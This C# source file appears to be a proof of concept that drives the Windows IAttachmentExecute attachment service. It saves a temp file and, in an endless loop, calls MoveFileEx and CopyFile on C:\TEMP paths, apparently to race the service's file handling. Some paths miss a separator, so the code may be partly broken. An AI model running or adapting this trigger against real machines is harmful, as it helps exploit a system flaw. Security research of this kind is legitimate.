using System;
using System.Runtime.InteropServices;

namespace PoCMoveFileEx2
{
    public enum AttachmentPrompt
    { 
        ATTACHMENT_PROMPT_NONE,
        ATTACHMENT_PROMPT_SAVE,
        ATTACHMENT_PROMPT_EXEC,
        ATTACHMENT_PROMPT_EXEC_OR_SAVE
    }

    public enum AttachmentAction
    {
        ATTACHMENT_ACTION_CANCEL,
        ATTACHMENT_ACTION_SAVE,
        ATTACHMENT_ACTION_EXEC,
    }

    [Guid("73DB1241-1E85-4581-8E4F-A81E1D0F8C57"), 
        InterfaceType(ComInterfaceType.InterfaceIsIUnknown)]
    public interface IAttachmentExecute
    {
        int SetClientTitle(string pszTitle);
        int SetClientGuid(Guid guid);
        int SetLocalPath(string localPath);
        int SetFileName(string pszFileName);
        int SetSource(string source);
        int SetReferrer(string referrer);
        int CheckPolicy();
        int Prompt(IntPtr hwnd, AttachmentPrompt prompt, out IntPtr paction);
        int Save();
        int Execute(IntPtr hwnd, string pszVerb, IntPtr phProcess);
        int SaveWithUI(IntPtr hwnd);
        int ClearClientState();
    }

    [ComImport, Guid("4125DD96-E03A-4103-8F70-E0597D803B9C")]
    public class AttachedServices { }

    [Flags]
    enum MoveFileFlags
    { 
        MOVEFILE_REPLACE_EXISTING = 0x00000001,
        MOVEFILE_COPY_ALLOWED = 0x00000002,
        MOVEFILE_DELAY_UNTIL_REBOOT = 0x00000004,
        MOVEFILE_WRITE_THROUGH = 0x00000008,
        MOVEFILE_CREATE_HARDLINK = 0x00000010,
        MOVEFILE_FAIL_IF_NOT_TRACKABLE = 0x00000020,
    }


    class Program
    {
        [return: MarshalAs(UnmanagedType.Bool)]
        [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Unicode)]
        static extern bool MoveFileEx(string lpExistingFileName, string lpNewFileName, MoveFileFlags dwFlags);

        [return: MarshalAs(UnmanagedType.Bool)]
        [DllImport("kernel32.dll", CharSet = CharSet.Unicode)]
        static extern bool CopyFile(string lpExistingFileName, string lpNewFileName, bool bFailIfExists);

        [STAThread]
        static void Main(string[] args)
        {
            while (true)
            {
                int result;
                var type = Type.GetTypeFromCLSID(new Guid("4125DD96-E03A-4103-8F70-E0597D803B9C"));
                var svc = (IAttachmentExecute)Activator.CreateInstance(type);

                result = svc.SetClientGuid(new Guid("2676A9A2-D919-4FEE-9187-152100393AB2"));
                Console.WriteLine($"SetClientGuid result {result}");

                result = svc.SetLocalPath(@"C:\TEMP\testfile.txt");
                Console.WriteLine($"SetLocalPath result {result}");

                result = svc.SetSource("https:// a - github - project");
                Console.WriteLine($"SetSource result {result}");

                result = svc.SetReferrer("https:// a - github - project");
                Console.WriteLine($"SetReferrer result {result}");

                result = svc.Save();
                Console.WriteLine($"Save result {result}");

                MoveFileEx(
                    @"C:\TEMPtestfile2",
                    @"C:\TEMPtestfile3",
                    MoveFileFlags.MOVEFILE_COPY_ALLOWED | MoveFileFlags.MOVEFILE_REPLACE_EXISTING
                );

                Console.WriteLine($"MoveFileEx result {Marshal.GetLastWin32Error()}");

                CopyFile(
                    @"C:\TEMPtestfile4",
                    @"C:\TEMPtestfile5",
                    false
                );

                Console.WriteLine($"CopyFile result {Marshal.GetLastWin32Error()}");
            }
        }
    }
}
